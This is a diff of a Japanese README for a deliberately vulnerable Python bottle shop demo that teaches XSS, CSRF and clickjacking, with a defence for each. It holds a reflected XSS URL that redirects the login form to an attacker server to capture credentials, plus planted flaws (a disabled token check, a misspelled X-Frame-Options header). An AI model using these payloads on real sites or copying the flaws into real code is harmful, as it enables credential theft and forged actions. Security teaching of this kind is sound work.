@@ -1,12 +1,17 @@
 # bottle-store
 
-EC site example using Python bottle.
+bottle.pyを使ったECサイトのデモンストレーションです。ソースコードにわざと脆弱性を仕込むことで、どんな攻撃が可能になるかを示していきます。
+
+Windowsを利用する前提で説明します。
 
 ## はじめかた（Windows）
 
-PythonとVSCodeをインストールします。
+まずPython3をインストールします。
 
-仮想環境を作ります。仮想環境名は```venv```とします。
+Visual Studio Code を使用して Python 初心者向けの開発環境をセットアップする
+https://docs.microsoft.com/ja-jp/learn/modules/python-install-vscode/
+
+Python3のインストールが完了したら、仮想環境を作ります。仮想環境名は```venv```とします。
 
 ```console
 > py -m venv venv
@@ -19,7 +24,7 @@ PythonとVSCodeをインストールします。
 (venv)> pip install -r requirements.txt
 ```
 
-データベースを初期化します。データベースのファイル```app.db```が作成されます。
+データベースを初期化します。データベースのファイル```app.db```と```evil.db```が作成されます。
 
 ```console
 (venv)> py setup.py
@@ -113,7 +118,7 @@ usersテーブルのid、email、hashed_password、nicknameが漏洩してしま
 
 ## 反射型クロスサイトスクリプティング（Reflected XSS）
 
-```app.py```を次のように書き換えます。bottleのテンプレートで!（エクスクラメーションマーク）は、変数をエスケープせず生のまま表示することを意味します。
+```app.py```を次のように書き換えます。画面に表示する変数```message```のエスケープ漏れです。bottleのテンプレートで!（エクスクラメーションマーク）は、変数をエスケープせず生のまま表示することを意味します。
 
 ```diff:app.py
 -<p style="color:red;"> {{ message }} </p>
@@ -145,7 +150,11 @@ http://localhost:8080/login?message=<script>alert(1)</script>
 http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
 ```
 
-もし正規のユーザーがこのURLを開いてしまうと、入力した情報が攻撃者に渡ってしまいます。
+もし正規のユーザーがこのURLを開いてしまうと、入力した情報が攻撃者に渡ってしまいます。攻撃者が盗み出した情報は、次の方法で確認できます。
+
+```
+http://localhost:8081/users
+```
 
 ### XSSを防ぐには
 
@@ -153,7 +162,7 @@ http://localhost:8080/login?message=<script>window.onload=function(){document.qu
 
 ## クロスサイト・リクエストフォージェリ（CSRF）と蓄積型クロスサイトスクリプティング（Persistent XSS）の合わせ技
 
-```app.py```を次のよう書き換えます。```form_token```と```cookie_token```のチェックをなくします。
+```app.py```を次のよう書き換えます。```form_token```と```cookie_token```のチェックをなくします。```form_token```はフォームに埋め込んだトークンです。フォームに情報が投稿されるときに一緒にWebアプリに渡されます。同じ値が署名付きcookieに格納されていて、Webアプリはそれぞれが同じ値かどうかをチェックしています。
 
 ```diff:app.py
 -    if form_token != cookie_token:
@@ -162,7 +171,7 @@ http://localhost:8080/login?message=<script>window.onload=function(){document.qu
 +    #    abort(400, '不正なアクセスです。')
 ```
 
-```form_token```はフォームに埋め込んだトークンです。フォームに情報が投稿されるときに一緒にWebアプリに渡されます。同じ値が署名付きcookieに格納されていて、Webアプリはそれぞれが同じ値かどうかをチェックしています。ユーザーがフォームを開いてから情報を投稿するのが正規の流れになりますが、それ以外のやり方で投稿できるようになってしまいます。
+正規の流れでは、ユーザーがフォームを開いてから情報を投稿しますが、それ以外のやり方で投稿できるようになってしまいました。
 
 攻撃者は攻撃サイトを準備し、甘い言葉で正規のユーザーにクリックを促します。
 
@@ -182,7 +191,7 @@ http://localhost:8081/evil_game1
 </form>
 ```
 
-ユーザーはゲームで遊ぼうと攻撃者のサイトでボタンをクリックしただけなのに、商品1に高評価をつけてしまいます。ユーザーに意図しない情報を投稿させてしまう攻撃がクロスサイト・リクエストフォージェリ（CSRF）です。
+ユーザーはゲームで遊ぼうと攻撃者のサイトでボタンをクリックしただけなのに、商品1に高評価をつけてしまいます。ユーザーに意図しない情報を投稿させてしまう攻撃がクロスサイト・リクエストフォージェリ（CSRF）です。なお、user_idはSQLインジェクションで入手した情報を使っている前提です。
 
 ```
 http://localhost:8080/products/1
@@ -224,16 +233,29 @@ http://localhost:8081/evil_game2
 
 ユーザーが投稿する情報にtokenを埋め込み、正規の投稿かどうかを確認しましょう。
 
-# Clickjacking
+## クリックジャッキング（Clickjacking）
+
+```app.py```を次のよう書き換えます。X-Frame-Optionsヘッダーのヘッダー名を間違え、sを抜かしたX-Frame-Optionにしてしまいました。
+
+HTMLの```\<iframe\>```タグを使うことで、別のサイトのWebページを自サイト上に掲載することができます。X-Frame-Optionsヘッダーは、別のサイトがiframe内にそのページを表示してよいかどうかを設定します。ヘッダー名を間違えてしまったので有効にならず、誰でもそのページをiframe内に表示することができるようになってしまいました。
 
 ```diff:app.py
 -    response.headers['X-Frame-Options'] = 'DENY'
 +   response.headers['X-Frame-Option'] = 'DENY'
 ```
 
+攻撃者は攻撃サイトを準備し、甘い言葉で正規のユーザーにクリックを促します。
+
 ```
 http://localhost:8081/evil_game3
 ```
 
-# DOM based XSS
+攻撃サイト上には、iframeで商品一覧ページが表示されていますが、消すチェックボックスを有効にすると、商品一覧ページが消えてしまいます。実際は消えているのではなく、CSSで透明度を変更し、見えなくしているだけで、そこに存在しています。正規のユーザーがボタンをクリックすると、勝手に商品を購入してしまいます。
+
+クリックする対象を隠すことで、意図しない結果を誘発するこの攻撃手法はクリックジャッキングと呼ばれています。
+
+### Clickjackingを防ぐには
+
+X-Frame-Optionsを正しく設定しましょう！
+
 
